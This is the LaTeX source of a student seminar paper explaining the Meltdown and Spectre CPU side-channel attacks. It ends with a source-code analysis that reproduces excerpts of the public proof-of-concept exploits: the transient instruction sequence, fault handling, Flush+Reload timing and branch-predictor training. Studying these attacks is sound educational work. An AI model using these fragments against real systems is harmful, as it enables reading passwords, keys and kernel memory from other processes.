% TEMPLATE FOR SEMINARS
%
% This template serves as a basic style for your seminar paper. Please
% make yourself familiar with LaTeX, BibTeX and this template. Several
% parts of the template need to be adjusted, these places are marked
% with FIXME.
%
% Contact your advisor in case you have questions.

\documentclass[a4paper,oneside,openright] {scrreprt}
\usepackage[T1]{fontenc}
\usepackage[latin1]{inputenc}
\usepackage[pdftex]{graphicx,color}
\usepackage{graphicx}
\usepackage{epsfig}
\usepackage{fancyhdr}
\usepackage{times}
\usepackage{url}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{listings}
%\usepackage{dtklogos}
%\usepackage{blindtext}
\usepackage{tikz}
\usepackage[T1]{fontenc}
%\usepackage{longtable}
%\usepackage{supertabular}
\usepackage{verbatim}
\usepackage{color}
\usepackage{moreverb}       % z.B. \listinginput
\usepackage{float}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{1.0,1.0,1.0}
 
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2,
    frame={shadowbox},
}
 
\lstset{style=mystyle}
 

\newcommand{\HRule}{\rule{\linewidth}{0.5mm}}

\title{\Huge Meltdown \& Spectre}
\author{\Large Marvin Schirrmacher}

\makeatletter

%*** Commands you may want to use ***
\newtheorem{theorem}{Theorem}[section]
\newtheorem{lemma}[theorem]{Lemma}
\newtheorem{proposition}[theorem]{Proposition}
\newtheorem{corollary}[theorem]{Corollary}
\newtheorem{definition}[theorem]{Definition}
\newtheorem{algorithm}[theorem]{Algorithm}
\newenvironment{example}{\begin{quote}{\bf Example:}}{\end{quote}}

\begin{document}

\input{titlepage}

\pagestyle{plain}
\cleardoublepage
\pagenumbering{roman}
\tableofcontents
\clearpage
\pagenumbering{arabic}

%************************************************************%
%* START WRITING HERE OR PROVIDE SECTIONS IN SEPERATE FILES *%
%************************************************************%

%%%
\chapter{Overview}  
\label{ch:overview}
%%%

Meltdown and Spectre are the result of the most critical vulnerabilities in todays processors 
which threaten the modern world of computing. They allow reading secret data from other processes running on
the same machine and thereby circumventing the protection mechanisms of operating systems.
These exploits put hardware and software companies under pressure for finding short-term as well
as long-term solutions to address arising problems. To avoid debacles quick solutions have been found 
for some of the uncovered exploit techniques, but in the long run the fundamental design of modern 
processors has to be challenged and reconsidered.

\section{Meltdown and Spectre in Brief}
\label{ch:intro:motivation}

Meltdown and Spectre misuse a feature of modern processors which enables fast execution of machine instructions, 
called \textit{out-of-order execution}. This feature allows to force the CPU to execute instructions 
which read secret data from address spaces of other processes or even the kernel address space. 
Even though the processors behave correctly by cleaning or vanishing illegally accessed data, 
they still leave traces which enable to build so called \textit{covert channels} 
and thus leveraging attacks likes Meltdown and Spectre.

\section{Relevance and Practical Impact}
\label{ch:intro:motivation}

Especially the rise of cloud computing accelerates the urgency for solving Meltdown and Spectre related issues.
Companies which run their software in the cloud became vulnerable because the exploit techniques enable attackers
to read private data of customers by running malicious software on the same machines. 

Also applications running on mobile phones or laptops are vulnerable and expose their sensitive data. 
Even browsers can easily be attacked with a short JavaScript implementation of Spectre and thus reveal secret data
like passwords, session keys or cookies from websites. These examples indicate that Meltdown and Spectre are a serious matter which should be dealt with.

This work introduces all basics needed to understand Meltdown and Spectre and also dives deeper into the implementation
to focus on technical details of the exploits. At the end the reader should have a deep understanding of Meltdown and Spectre
and should be able to distinguish their traits and impact on modern computing.

%%%
\chapter{Computer Architecture Basics}
\label{ch:basics}
%%%

This chapter introduces some basics which are needed to understand and create implementations of Meltdown and Spectre. 
All parts of this chapter are presented isolated and not in the context of the exploits. 
Rather their connection and purpose is highlighted in chapters ~\ref{ch:meltdownVersusSpectre} and ~\ref{ch:sourceCodeAnalysis}.

\section{Processes and Address Spaces}
\label{ch:intro:motivation}

Operating systems use processes as an abstraction to handle execution of multiple programs at the same time
 and for managing their associated resources like address spaces, registers, list of open files, 
 out-standing alarms and lists of related processes ~\cite{tanenbaum2009modern:39-41}. 
CPU hardware ensures that processes of the operating system, \textit{kernel processes}, 
and user processes, e.g. regular applications, are protected from each other by generating isolated address spaces for each process 
and preventing modification or illegal access of their resources ~\cite{silberschatz2012operating}.
Memory isolation is the core feature for securing sensitive data of programs running on the same machine.

Memory isolation is realized with the help of \textit{virtual address spaces} 
which are mapped into \textit{physical address space}, i.e. the actual memory location.
Processes can only access memory which is mapped into their own virtual address space.
So called \textit{page tables} check access permission of a process to a given memory location ~\cite{hennessy2011computer:105-107}.
Virtual address spaces are further divided into fixed-size \textit{pages} which form small blocks of memory.
Page tables know which process is allowed to access specific pages and thus serve as
a data structure to restrict and monitor illegal memory access.

If a process tries to circumvent these isolation boundaries by accessing protected memory a fatal error or \textit{trap}
is raised by the operating system. A trap prompts the operating system to kill the responsible process.
Even so there are techniques to prevent termination of a program raising errors which are utilized by the Meltdown attack.

\section{Caching}
\label{ch:intro:chaching}

The cache of a computer stores small amounts of data close to the CPU which can be accessed with low latency. 
A cache can be divided into \textit{cache lines} which hold recently used memory locations ~\cite{tanenbaum2009modern:24-27}. 
Because the size of a cache is limited cache lines have to be evicted over time depending on their frequency 
of usage resulting in a \textit{cache hit} if a line is cached, otherwise in a \textit{cache miss}.
If a cache miss occurs the processor has to load data from another
cache or from memory which delays data access by a significant amount of time.
This notion is important for Meltdown and Spectre because the attacks apply time measurements to detect cached data. 

\section{Out-of-order Execution}
\label{ch:intro:motivation}

Tomasulo ~\cite{tomasulo1967efficient} created an algorithm which analyses a set or \textit{window} of
program instructions and their relationships to maximize their overlapping capabilities and thus the ability to get parallelized 
without harming essential precedences. This concept allows processors to reorganize instructions so that their execution is much faster 
in comparison to the execution of the original order.
Succeeding instructions can be executed in parallel if preceding ones
 have to wait for accessing memory in case of a cache miss~\cite{hennessy2011computer:183}.
Out-of-order execution is a fundamental feature of modern processors to accelerate performance.
Unfortunately this feature enables attacks like Meltdown and Spectre because out-of-order execution can leak sensitive information
of protected memory locations as we will see in ~\ref{ch:meltdownVersusSpectre} and ~\ref{ch:sourceCodeAnalysis}.

\section{Branch Prediction}
\label{ch:intro:branch_prediction}

Branch prediction is another feature of processors used to guess the result of a conditional branch in a sequence 
of program instructions to gain performance boosts ~\cite{smith1995microarchitecture}.
So called \textit{branch predictors} analyse static information, e.g. opcode types, or dynamic program information, 
e.g. the branch history, to predict the result of conditional branches.
The prediction decides if the instructions following the branch condition should be executed or not.
If the guess is correct performance improvements are gained because following statements can be executed in advance 
while the condition is evaluated. So branch prediction is also related to out-of-order execution.
Branch prediction is especially relevant for Spectre which attacks branch predictors to reveal secret data of 
protected memory locations.

\section{Transient Instructions}
\label{ch:intro:branch_prediction}

As already mentioned above out-of-order execution reorders program instructions to accelerate CPU performance.
An instruction which is mistakenly executed in advance, e.g. when a branch condition is predicted incorrectly by the branch predictor, 
is called a \textit{transient instruction} ~\cite{lipp2018meltdown, kocher2018spectre}.
When the CPU detects that a transient instruction was executed it inverts its effects by dismissing results 
and resetting the state of affected registers.
We will see in chapter ~\ref{ch:meltdownVersusSpectre} that modern processors do not remove all traces of transient instructions 
and thus enable Meltdown and Spectre attacks.

This Chapter introduced some fundamentals which are needed for understanding Meltdown and Spectre as well as their 
effects on the architectural state of the CPU and the operating system. The next Chapter will show how these parts
are connected in the context of the exploits.

%%%
\chapter{Meltdown versus Spectre}
\label{ch:meltdownVersusSpectre}
%%%

The following chapter deals with the common features and differences of Meltdown and Spectre based on the
 original papers ~\cite{lipp2018meltdown, kocher2018spectre}. This chapter highlights why the exploits are related
 and shows how they use different techniques to achieve their goals.
 
 
 \section{Differences in Brief}
 \label{ch:intro:motivation}
 
Meltdown and Spectre both misuse out-of-order execution and transient instructions as techniques to access memory of 
protected contexts by analyzing side channel information of the CPU's cache. 
Meltdown enables an attacker to read memory of kernel and user processes
in contrast to Spectre which just allows to dump memory of the same process, e.g. of sandboxes, or other user processes. 
Spectre affects all modern processors like Intel, AMD, and ARM while Meltdown
is currently only exploitable on Intel processors. 
The challenge of Spectre is that it has to be adapted for victim programs
because libraries or binaries have to be analyzed to find exploitable gadgets. 
Meltdown on the other hand is a more general approach with regard to its implementation. The following sections compare Meltdown and Spectre in depth.
 
\section{What Unites Them?}
\label{ch:intro:motivation}

This section deals with the common features of Meltdown and Spectre in detail. 
Both attacks use out-of-order execution and transient instructions to manipulate the cache of a CPU and thereby
creating so called \textit{covert channels} to reveal secret data. Although they apply different techniques, 
as we will see in chapter ~\ref{ch:whatDividesThem}, both attacks misuse the design of modern processors
by analyzing traces of \textit{microarchitectural state} changes. 

\subsection{Usage of Transient Instructions}
\label{ch:intro:motivation:A}

When a transient instruction is executed the microarchitectural state of a CPU is altered, e.g. registers are filled with results
of the instruction and the cache is manipulated. When the CPU detects that the speculatively executed instruction should not have been executed it cleans these state
changes as already mentioned. So from the outer architectural view processors behave correctly. 
Despite modern processors do not eliminate all microarchitectural state changes properly so that the execution of a transient instruction
 leaves exploitable traces. In the case of Meltdown and Spectre the cache is altered with speculatively executed instructions resulting
 in a microarchitectural state change which helps to reveal protected bytes of memory.

 \subsection{Building Covert Channels}
\label{ch:intro:motivation:A}

Side-channel attacks use physical channels like power consumption or timing behavior of programs to
leak secret data. Meltdown and Spectre are side-channel attacks, more precisely \textit{cache attacks}, 
utilizing the timing behavior of the cache ~\cite{osvik2006cache}.

The core idea of the attacks is to execute transient instructions 
which access memory by interweaving the access location with an unknown secret value from another protected context. 
When the CPU loads the secret value to dynamically calculate the target access location 
it detects that the instruction is transient and vanishes the secret value and the result of the final memory location from its state. 
Though the access instruction was executed in advance, before the CPU detects that it is transient, the microarchitectural state
 of the CPU is already altered.
 Since memory locations are cached when being read and the processor does not clean its microarchitectural state properly,
 we just have to detect which memory location has been cached to recreate the secret value.
 Meltdown and Spectre instrumenting techniques like Flush+Reload ~\cite{yarom2014flush} 
 or Evict+Reload ~\cite{gruss2015cache} to find out the cached memory location which depends on the secret value.
These techniques load many locations from memory and measure how much time the access takes to detect cached ones.

Flush+Reload flushes the cached data of the attacker's process with intrinsic CPU instructions and reloads a target memory location,
the one depending on the secret value.
The reloaded and thereby cached location can be detected by measuring the access time which is significantly smaller than the access
time of flushed locations.
Evict+Reload works similarly to Flush+Reload but instead of flushing the cache it gets evicted by accessing many uncached memory
locations so that cached ones are vanished.
This technique is useful when flush instructions are not available, e.g. for high-level JavaScript implementations of Spectre. 

For both attacks the cache acts as a covert channel making the inner workings of the CPU visible to the outside world. 
The next section explains the details of revealing secret data with the mentioned techniques. 

\subsection{Process of Revealing Secret Data}
\label{ch:intro:motivation:A}

Meltdown and Spectre exploit the execution of transient instructions by accessing bytes of memory contexts 
 which are usually protected by the CPU, the operating system or sandboxes. 

For revealing a secret byte two registers, R1 and R2, must be under control of the attacker. The contents of these registers have to be 
combined with an operation like add, subtract or XOR. Besides an array, the so called \textit{probe array}, has to be 
initialized in the attacker's address space with the size of 256, i.e. byte size, times the size of a memory page of the attacked machine.
This array will reveal secret bytes as explained below.

The transient instructions of Meltdown and Spectre consist of the following steps:
The attacker loads the base address of the probe array into R1 and combines it with a secret byte loaded into R2. 
Then the element of the probe array at the resulting address, e.g. R1+R2, has to be accessed by the malicious instruction sequence.
Thus the secret byte in R2 can be seen as the offset location which points to one of the 256 elements of the probe array.

The next step after executing the transient instruction is to find the element of the probe array which has been cached by the processor
because this must be the accessed element.
A cached element is loaded significantly faster into a register of the CPU than accessed from memory.
If every element of the probe array is checked for being cached by utilizing techniques like Flush+Reload or Evict+Reload it is possible
to reveal the secret byte because it matches the position of the cached element.
This process can be executed iteratively to reveal many secret bytes from protected contexts. Its important to mention that this exploit
applied by Meltdown and Spectre can also be realized with high-level languages like JavaScript.

This chapter highlighted the common techniques of Meltdown and Spectre and how they can be used to access protected memory.
The next chapter will focus on the differences of the exploits.

\section{What Divides Them?}
\label{ch:whatDividesThem}

This chapter deals with the differences of Meltdown and Spectre. As mentioned above Meltdown enables an attacker 
to dump kernel memory and memory of user processes. On the other hand Spectre can just be utilized to read protected memory from 
the same process (sandboxes) or from other user processes.
Adding to this the implementation of Spectre is more specific because it requires adaptation to the attacked process,
 e.g. by analyzing the binaries a program uses. Meltdown is a more general approach with the limitation that it just works on Intel
 processors in contrast to Spectre which is applicable on all modern processors like Intel, AMD, and ARM. Furthermore Meltdown and 
 Spectre use different implementation details regarding the usage of transient instructions.
 All these details will be examined in the following.

\subsection{Dealing with Exceptions}
\label{ch:intro:motivation:A}

As explained above Meltdown and Spectre try to manipulate the cache with the help of transient instructions. 
When a CPU detects illegal memory access within such instructions a fatal error is raised and the program of the attacker
is terminated. Spectre does not need to deal with errors because it just accesses memory locations which are valid from
the viewpoint of the operating system and CPU.
Meltdown on the other hand tries to access memory locations of the kernel which leads to segmentation faults.
So there is a race condition of the CPU between raising the error and cleaning it's microarchitectural state.
Therefore Meltdown has two concepts of avoiding program termination: \textit{exception handling} and \textit{exception suppression}.
Spectre only applies exception suppression as explained in the following.

\subsubsection{Exception Handling}

Exception handling is the process of catching raised errors. Meltdown uses signal handlers to catch errors
which are executed in case of a segmentation fault. The implementation of catching 
segmentation faults with signal handlers is presented in chapter ~\ref{ch:sourceCodeAnalysis}.
The Spectre attack does not need to catch segmentation faults because the accessed addresses are either
mapped to the virtual memory of the same process or the virtual address of the accessed location is valid 
for attacker's process as well as the victim's process due to equivalent program structure.

\subsubsection{Exception Suppression}

Exception suppression is the process of preventing that an error is raised. 
The Spectre implementation of chapter ~\ref{ch:sourceCodeAnalysis} manipulates the branch predictor to achieve exception suppression.
This can be done by putting illegal memory fetches within a branch condition. 
The goal is to trick the branch predictor so that the condition is predicted incorrectly and the following
instructions are speculatively executed.
Then errors do not terminate the attacker's process, instead the CPU silently vanishes their results
 but still leaves exploitable traces in the cache.
The Meltdown attack only applies exception suppression on Intel TSX processors which allow grouping of transient instructions.
Created instruction groups, also called transactions, can be reversed as a whole after failing and thus absorb occurring errors.
Chapter ~\ref{ch:sourceCodeAnalysis} also deals with the exception suppression implementation of Meltdown.

\subsection{Complexity and Impact}
\label{ch:intro:motivation:A}

Since Meltdown circumvents segmentation faults it enables the attacker to read arbitrary protected memory locations 
even from kernel address space.
Thus Meltdown breaks memory isolation of the malicious program and achieves privilege escalation. 

On the other hand Spectre just tries to read legal memory locations.
This means that the target memory location has to be mapped to the virtual address space of the attacked process.
This can either be the process running the malicious program or another user process.
Hence Spectre does not achieve privilege escalation.

To reveal memory of other user processes with Spectre the attacker has to search for so called \textit{gadgets}.
Gadgets can be found in binaries of the victim program, e.g. instructions accessing array locations after an indirect branch condition.
Indirect branches are necessary for this variant of Spectre because the destination address for the next instruction gets predicted 
by the branch predictor in case of a cache miss.
This allows to continue program execution at malicious addresses when the branch predictor is poisoned.

For the exploit the branch predictor of the CPU is trained by the attacker's process to continue at a malicious location 
within the gadget. When the branch predictor is trained and the victim program executes the gadget out-of-order, 
the program speculatively continues at the attacker's target location.
Then the executed transient instructions within the gadget alter the microarchitectural state of the processor.
Afterwards mentioned cache attacks can be applied to reveal secret data.
So the gadget is used as a gateway to send secret data to a covert channel.
Thus the manipulation of the branch predictor in one context (the attacker's process) affects the execution of a program
within another context (the victim process). 
This is only possible if the accessed memory location within the gadget is a valid location in both contexts.
Otherwise training of the branch predictor would not trigger out-of-order execution in the victim process.

All in all Spectre is more complex than Meltdown if memory of other user processes should be dumped.
It requires a sophisticated analysis of the victim program and it's libraries or binaries to find gadgets.
If the attacker wants to read memory of the same process Spectre is as simple as Meltdown because gadgets within the victim program
are not required.

Another important difference between Meltdown and Spectre is that the former is only applicable on Intel processors while Spectre 
also affects AMD and ARM processors. The reason for that is not known by the researchers but it might be possible that current 
implementations of Meltdown are not perfectly optimized.

This chapter highlighted the differences between Meltdown and Spectre to get a deeper understanding of the exploits.
Now the foundation for the next chapter is given so that implementations of the attacks can be presented.

%%%
\chapter{Source Code Analysis}
\label{ch:sourceCodeAnalysis}
%%%

This chapter shows example implementations of Meltdown and Spectre created by the researchers of the original papers.
The implementations will highlight how the exploits work in detail.

\section{Meltdown Implementation}
\label{ch:intro:motivation}

This section deals with the implementation of Meltdown\footnote{https://github.com/IAIK/meltdown/tree/master/libkdump} applying
Flush+Reload to build a covert channel. The focus of the following is just on the core functionality of the implementation.

\subsection{Transient Instruction Sequence}
\label{ch:TransientInstructionSequence}

Listing ~\ref{lst:meltdown} shows the x86 assembly implementation of the transient instruction sequence
which enables the Meltdown exploit.
Like explained above a probe array has to be initialized with 256 page sized elements.
\texttt{RBX} contains the base address of the probe array.
Line 4 tries to access a protected memory location from the kernel space and loads the result into \texttt{RAX}. 
This action will raise an error which will be handled by techniques mentioned in the following.
When the error is raised the microarchitectural state of the CPU, i.e. the cache, is already altered 
by the instruction from line 7 which is executed out of order to access an element of the probe array.
There is a race condition between the raise of the exception and execution of malicious instructions shown in listing ~\ref{lst:meltdown}.
So the attack might fail and many iterations have to be applied to reveal secret data.

\begin{lstlisting}[language={[x86masm]Assembler}, caption=Meltdown: Transient Instruction Sequence, label={lst:meltdown}]
; rcx = kernel address
; rbx = probe array
retry:
mov al, byte [rcx]
shl rax, 0xc
jz retry
mov rbx, qword [rbx + rax]
\end{lstlisting}

The probe array access location is computed by adding the base address of the probe array to the content of \texttt{RAX} which 
is the secret byte multiplied by the size of a memory page in line 5.
This is necessary to ensure that the distance of the accessed elements is large enough so that caching of adjacent memory locations
is avoided.
After execution of line 7 the probe array element at location \texttt{RBX+RAX*4096} is fetched by the transient instruction and
cached by the CPU. 
Then techniques like Flush+Reload or Evict+Reload can be applied to reveal the secret byte from protected memory context by finding
the cached probe array element.


\subsection{Dealing with Exceptions}
\label{ch:intro:motivation:A}

Meltdown uses exception handling and exception suppression to avoid crashes of the attacker program when accessing protected memory.
Listing ~\ref{lst:signalhandler} shows an example implementation of an exception handler.
Signal handlers allow a program to react to certain execution events. 
\texttt{SIGSEGV} is the event which should be handled in the case of Meltdown because illegal memory locations 
which are not mapped to the virtual address space of the attacker's process are accessed.
Line 3 in this example unblocks the \texttt{SIGSEGV} event and thus prevents crashes when a segmentation fault is detected.

\begin{lstlisting}[language=C, caption=Meltdown: Exception Handling 1, label={lst:signalhandler}]
static void segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(buf, 1);
}
\end{lstlisting}

The implementation of \texttt{unblock\_signal} is presented in listing ~\ref{lst:unblocksignal}. 
Here a signal set is initialized where the \texttt{SIGSEGV} event is added to.
Afterwards the signal mask of the process is changed by removing \texttt{SIGSEGV} events with the \texttt{sigprocmask} function call.
This has the consequence that the process is not blocked by segmentation faults, hence raised errors are handled.

\begin{lstlisting}[language=C, caption=Meltdown: Exception Handling 2, label={lst:unblocksignal}]
static void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}
\end{lstlisting}

As an alternative to exception handling Meltdown applies exception suppression which is realized by reverting grouped instructions.
This technique is just implemented for Intel TSX processors and can be seen in listing ~\ref{lst:tsx}.

\begin{lstlisting}[language=C, caption=Meltdown: Exception Suppression on Intel TSX, label={lst:tsx}]
if (xbegin() == _XBEGIN_STARTED) {
  MELTDOWN;
  xend();
}
\end{lstlisting}

With the call of \texttt{xbegin} a transaction is started, i.e. a set of instructions.
\texttt{\_XBEGIN\_STARTED} indicates that the transaction started successfully.
Line 2 contains the actual Meltdown exploit which is highlighted in chapter ~\ref{ch:TransientInstructionSequence}.
The \texttt{xend} call commits the current transaction so that the attack gets executed by the processor.
When a segmentation fault is thrown by the CPU the transaction is just rolled back and does not terminate the attacker's process,
hence raised errors are suppressed.

\subsection{Building a Covert Channel}
\label{ch:intro:motivation:A}

Listing ~\ref{lst:flushAndReload} contains the Flush+Reload implementation of Meltdown. 
The reload instruction of the pointer \texttt{ptr} in line 5 is wrapped 
by time measurements utilizing the intrinsic instruction \texttt{\_rdtsc} for reading the time-stamp counter of the CPU ~\cite{intelintrinsics}. 
Depending on the measured time the value is assumed to be cached if it is smaller
than the \texttt{cache\_miss\_threshold} value which has to be calculated in advance.
In line 8 \texttt{ptr} is flushed with an underlying intrinsic instruction called \texttt{\_mm\_clflush } ~\cite{intelintrinsics}
so that it no longer resides in the cache.

\begin{lstlisting}[language=C, caption=Meltdown: Flush+Reload, label={lst:flushAndReload}]
static int __attribute__((always_inline)) flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;
  
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
  
    flush(ptr);
  
    if (end - start < config.cache_miss_threshold) {
      return 1;
    }
    return 0;
}
\end{lstlisting}

Listing ~\ref{lst:computeThreshold} illustrates how the cache-threshold can be determined.
The implementation applies one million iterations to compute a precise threshold value.
Therefore a pointer \texttt{ptr} is accessed in line 6 so that it's referenced data gets cached. 

\begin{lstlisting}[language=C, caption=Meltdown: Cache Miss Threshold 1, label={lst:computeThreshold}]
size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
size_t dummy[16];
size_t *ptr = dummy + 8;
uint64_t start = 0, end = 0;
  
maccess(ptr);
for (i = 0; i < count; i++) {
  start = rdtsc();
  maccess(ptr);
  end = rdtsc();
  reload_time += (end - start);
}
for (i = 0; i < count; i++) {
  start = rdtsc();
  maccess(ptr);
  end = rdtsc();
  flush(ptr);
  flush_reload_time += (end - start);
}
reload_time /= count;
flush_reload_time /= count;
\end{lstlisting}

Afterwards the access time is measured to detect how long it takes to retrieve the cached value. 
Then the pointer's referenced data is removed from the cache in line 17 and thus reloaded from memory in every iteration.
At the end the average access time for cache hits and cache misses are computed.
Listing ~\ref{lst:computeThreshold} shows the final computation of \texttt{cache\_miss\_threshold}.

\begin{lstlisting}[language=C, caption=Meltdown: Cache Miss Threshold 2, label={lst:finalthreshold}]
config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
\end{lstlisting}

\subsection{Reading Secret Bytes}
\label{ch:intro:motivation:A}

This section shows how all parts mentioned above are connected to read secret bytes.
In listing ~\ref{lst:readsecretbytes} a working Meltdown implementation is shown which utilizes
signal handlers. The implementation for Intel TSX processors is equivalent.
Just line 6 is specific to the signal handler technique where \texttt{setjmp} is used to save the program's execution state.
When a segmentation faults occurs \texttt{longjmp} in listing ~\ref{lst:signalhandler} is called to reestablish the program's state
without restoring the signal mask. 
So the malicious program is not terminated by segmentation faults and the next iteration can be executed.

Line 7 contains the Meltdown core instructions shown in listing ~\ref{lst:meltdown}.
After their execution Flush+Reload is applied to the variable \texttt{mem} which contains the data
from a specific location of the probe array. As already explained the access location is interweaved with a
secret byte so that the index of the cached element has to be found to reveal it.


\begin{lstlisting}[language=C, caption=Meltdown: Reading Secret Bytes, label={lst:readsecretbytes}]
int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
    size_t retries = config.retries + 1;
    uint64_t start = 0, end = 0;
  
    while (retries--) {
      if (!setjmp(buf)) {
        MELTDOWN;
      }
  
      int i;
      for (i = 0; i < 256; i++) {
        if (flush_reload(mem + i * 4096)) {
          if (i >= 1) {
            return i;
          }
        }
        sched_yield();
      }
      sched_yield();
    }
    return 0;
}
\end{lstlisting}

So we iterate over all possible probe array indices to find a cache hit with Flush+Reload in line 12.
Here \texttt{4096} indicates the memory page size which is multiplied by the index \texttt{i} to access the next element
of the probe array which contains 256 times 4096 bytes. The access of page sized elements prevents that adjacent elements are loaded
and cached simultaneously. This would lead to invalid measurement results.
If a cached probe array element has been found the value \texttt{i} equals the secret byte which is returned to the caller
in line 14. If there is no cache hit the secret byte is assumed to equal zero (see line 21).

In line 17 and 19 \texttt{sched\_yield} is called so that the Meltdown attack is executed by the next thread if more
than one was configured. 
Increasing the number of threads should improve the chance of reading protected memory and reduce the error rate.


\section{Spectre Implementation}
\label{ch:intro:motivation}

This chapter examines an example C++ implementation of Spectre which also applies Flush+Reload and some advanced techniques
to manipulate the branch predictor.

\subsection{Building a Covert Channel}
\label{ch:intro:motivation:A}
 
This section illustrates how Spectre creates a covert channel with Flush+Reload. 
In listing ~\ref{lst:victim} the flush part of the Flush+Reload attack is shown. It utilizes the intrinsic instruction 
\texttt{\_mm\_clflush} ~\cite{intelintrinsics} to clean the probe array \texttt{array2} from the cache. This part resets the cache state
so that time measurements can be conducted afterwards. If Spectre is implemented in high-level languages like JavaScript it
might be the case that \texttt{\_mm\_clflush} is not available as a function call. Then other techniques like Evict+Reload have
to be applied.

\begin{lstlisting}[language=C, caption=Spectre: Flush, label={lst:flush}]
for (i = 0; i < 256; i++)
    _mm_clflush(&array2[i * 512]); /* clflush */
}
\end{lstlisting}

The next step is the reload phase where all elements of the probe array are tested for being cached. 
Listing ~\ref{lst:reload} contains the instructions of this phase. Line 3 maps the index value \texttt{i} to pseudorandom numbers
 so that the access of the elements is scattered and not conducted linearly. 
 This is necessary because neighboring pages might be cached if 
accessed linearly which would lead to invalid measurement results. Line 6 contains the actual reload instruction which is wrapped 
by time measurements.
To measure the access time precisely the intrinsic instruction \texttt{\_\_rdtscp} ~\cite{intelintrinsics} is used which
copies the CPU's time-stamp counter. High precision timers are crucial for the attack. For this reason browsers like 
Google Chrome reduced the precision of the \texttt{performance.now()} function to mitigate Spectre attacks ~\cite{chromeSpectreMeltdown}.
To distinguish a cached memory location from an uncached one it is necessary to compute the value \texttt{CACHE\_HIT\_THRESHOLD}.
This value has to be adapted for the CPU and can be calculated by taking the average time of many cache hits.
If the measured access time is smaller or equal to the threshold the index of the related element is considered as a potential result.

\begin{lstlisting}[language=C, caption=Spectre: Reload, label={lst:reload}]
for (i = 0; i < 256; i++)
{
    mix_i = ((i * 167) + 13) & 255;
    addr = &array2[mix_i * 512];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD &&
        mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit -> score +1 for this value */
}
\end{lstlisting}

\subsection{Tricking the Branch Predictor}
\label{ch:intro:motivation:A}

Tricking the branch predictor is the core of the Spectre attack. Listing ~\ref{lst:twiddling} contains instructions which
 set the value of a variable \texttt{x} within a for-loop to confuse the branch predictor.
The variable \texttt{x} represents the access location of an array which is the starting point for malicious memory access.
The idea is to fill \texttt{x} over many iterations with valid locations so that the branch predictor believes
that it's value is within the array bounds. But in some of the iterations \texttt{x} is set to an invalid memory location
which is out of the array bounds where the secret bytes should be read.

\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking, label={lst:twiddling}]
x = ((j % 6) - 1) & ~0xFFFF;
/* Set x=-1 if j&6=0, else x=0 */
x = (x | (x >> 16));
x = training_x ^ (x & (malicious_x ^ training_x));
    
/* Call the victim! */
victim_function(x);
\end{lstlisting}

Although the instruction sequence seems complicated it just sets the value \texttt{x} to the malicious target location 
\texttt{malicious\_x} in every 6th iteration. In every other iteration \texttt{x} is set to \texttt{training\_x}.
Listing ~\ref{lst:simplified} shows the semantic equivalent which is not applicable for the attack because the compiled code
contains jump instructions which give the branch predictor hints that \texttt{malicious\_x} and also \texttt{x} are invalid.
The source code of listing ~\ref{lst:twiddling} is optimized so that the compiled instructions contain no jumps.

\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking Simplified, label={lst:simplified}]
x = (j % 6 == 0) ? malicious_x : training_x;
\end{lstlisting}

Listing ~\ref{lst:victim} shows an example victim function. The goal is to trick the branch predictor so that the if condition is 
assumed to be true even if the value \texttt{x} is out of the array bounds. The value \texttt{512} indicates the memory page size of the
attacked program which is multiplied by the secret value accessed through \texttt{array1}. So an element of \texttt{array2}, the probe array, is loaded
and thus cached if the instruction in line 5 is executed. Then Flush+Reload has to be applied to identify the cached element
and the secret byte at memory location \texttt{x}.

\begin{lstlisting}[language=C, caption=Spectre: Example Victim Gadget, label={lst:victim}]
void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512];
    }
}
\end{lstlisting}

It is also important that the variable \texttt{array1\_size} of listing ~\ref{lst:victim} is flushed from the cache so that out-of-order
execution is triggered when the value has to be loaded from memory due to a cache miss so that the transient instruction within
the branch condition can be executed in advance.

To achieve good measurements with Flush+Reload the Spectre implementation uses 1000 iterations to be sure that the results
are significant. Within these iterations the branch predictor is trained with another 30 iterations leading to a low error rate (<0.01\%)
of reading secret bytes from protected contexts.

\subsection{Reading Secret Bytes}
\label{ch:intro:motivation:A}

Listing ~\ref{lst:maliciousX} shows how the starting address \texttt{malicious\_x} for the attack is computed.
It contains the offset from a protected array \texttt{secret} to the gadget array \texttt{array1} 
which is utilized to access the data through.

\begin{lstlisting}[language=C, caption=Spectre: Malicious X, label={lst:maliciousX}]
size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
\end{lstlisting}

\texttt{malicious\_x} serves as an input for the \texttt{readMemoryByte} function in line 4 of listing ~\ref{lst:spectreReadingSecretBytes} 
which contains all implementations presented above.
Here \texttt{malicious\_x} is incremented to loop over all secret bytes of the \texttt{secret} array.
The \texttt{score} variable represents an estimation for the effectiveness of the attack.
It might be possible that more iterations have to be conducted to improve the results and to lower the error rate
 or that the constant value \texttt{CACHE\_HIT\_THRESHOLD} has to be adapted to enhance the timing measurements of the exploit.
In contrast to the Meltdown implementation there is no function for computing the cache-threshold dynamically depending on the attacked machine.
